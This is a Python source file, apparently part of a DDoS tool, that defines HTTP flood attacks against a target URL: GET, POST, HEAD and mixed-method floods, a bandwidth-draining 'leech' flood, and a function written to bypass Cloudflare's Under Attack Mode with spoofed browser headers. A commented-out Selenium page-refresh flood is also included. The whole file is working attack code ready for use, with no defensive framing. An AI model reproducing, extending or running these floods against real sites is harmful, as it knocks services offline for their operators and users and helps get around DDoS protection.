# import modules
import socket
import requests
import time
import json
from random import randint, choice, uniform, shuffle

# import depencies
from src.utils import *
from src.core import *

# disable "InsecureRequestWarning"'s
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def http_get(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    HTTP GET flood
    '''

    if target_url is None: # target_url is a required arg
        return False

    time.sleep(5) # wait for other threads to spawn

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_post(worker_id, session, target_url, attack_duration, useragent=None, referer=None, post_data=None):
    '''
    HTTP POST flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            headers = buildheaders(target_url, useragent, referer)

            payload_choice = randint(0,2)
            data = randstr(randint(10,20))
            if payload_choice == 1: # json payload
                json_data = {}
                for _ in range(10):
                    if randint(0,1) == 1: json_data.update({randstr(randint(5, 20)): randstr(randint(40, 60))})
                    else: json_data.update({randstr(randint(5, 20)): {choice(keywords): choice(keywords)}})

                data = json.dumps(json_data)               
                headers.update({'Content-Type': 'application/json', 'Content-Length': str(len(data))})
            elif payload_choice == 2: # url encoded payload 
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                data = url_encoded_data

            session.post(f'{target_url}{buildblock(target_url)}', headers=headers, data=data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_fast(worker_id, session, target_url, attack_duration, useragent=None):
    '''
    basic GET / flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(f'{target_url}/', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_head(worker_id, session, target_url, attack_duration, useragent=None):
    '''
    Basic HEAD flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_ghp(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    GET/HEAD/POST flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:

            method_choice = randint(0,2)
            if method_choice == 0: session.head(f'{target_url}{buildblock(target_url)}', headers={'User-Agent': choice(ualist) if useragent is None else useragent}, verify=False, timeout=2, allow_redirects=False, stream=False)
            elif method_choice == 1: session.get(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=(5, 2), allow_redirects=False, stream=False)
            elif method_choice == 2: # url encoded data flood only
                url_encoded_data = f'{choice(keywords)}={choice(keywords)}'

                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: url_encoded_data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                session.post(f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=url_encoded_data, verify=False, timeout=2, allow_redirects=False, stream=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_leech(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    Exotic bandwidth draining flood
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    headers = buildheaders(target_url, useragent, referer)
    while time.time() < stoptime and Core.attackrunning:
        try:

            session.get(target_url, headers=headers, verify=False, timeout=2, allow_redirects=False, stream=False)
            time.sleep(uniform(80, 160))

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_mix(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
    '''
    Flood which randomly chooses HTTP methods
    '''

    if target_url is None:
        return False

    time.sleep(5)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            methods = ['GET', 'POST', 'HEAD', 'PATCH', 'DELETE', 'PUT', 'TRACE', 'CONNECT', 'OPTIONS', randstr(randint(2,6)).upper()]
            shuffle(methods)
            method = choice(methods)
            headers = buildheaders(target_url, useragent, referer)
            if method == 'POST': 
                data = f'{choice(keywords)}={choice(keywords)}'
                for _ in range(randint(0, 12)):
                    if randint(0,1) == 1: data += f'&{choice(keywords)}={choice(keywords)}'
                    else: pass

                session.request('POST', f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), data=data, verify=False, timeout=2, allow_redirects=False, stream=False)
            else: session.request(method, f'{target_url}{buildblock(target_url)}', headers=buildheaders(target_url, useragent, referer), verify=False, timeout=2, allow_redirects=False, stream=False)
            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

def http_cfbp(worker_id, scraper, target_url, attack_duration, useragent=None, referer=None):
    '''
    Attack which tries to bypass Cloudflare's UAM (Under Attack Mode)
    '''

    if target_url is None:
        return False

    time.sleep(5)

    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            scraper.get(url=target_url, headers=headers, timeout=2, allow_redirects=False)

            Core.infodict[worker_id]['req_sent'] += 1
        except Exception as e:
            print(str(e).rstrip())
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1

    Core.threadcount -= 1

'''
def browser_emulate(worker_id, target_url, attack_duration, useragent=None):
    \'''
    Flood which uses Selenium and a specified browser driver to constantly refresh a page
    \'''

    if target_url is None:
        return False

    time.sleep(5)

    driver = getdriver(useragent)
    driver.get(target_url)

    stoptime = time.time() + attack_duration
    while time.time() < stoptime and Core.attackrunning:
        try:
            driver.refresh()
            Core.infodict[worker_id]['req_sent'] += 1
        except Exception:
            Core.infodict[worker_id]['req_fail'] += 1
        Core.infodict[worker_id]['req_total'] += 1
    Core.threadcount -= 1

    driver.close()
'''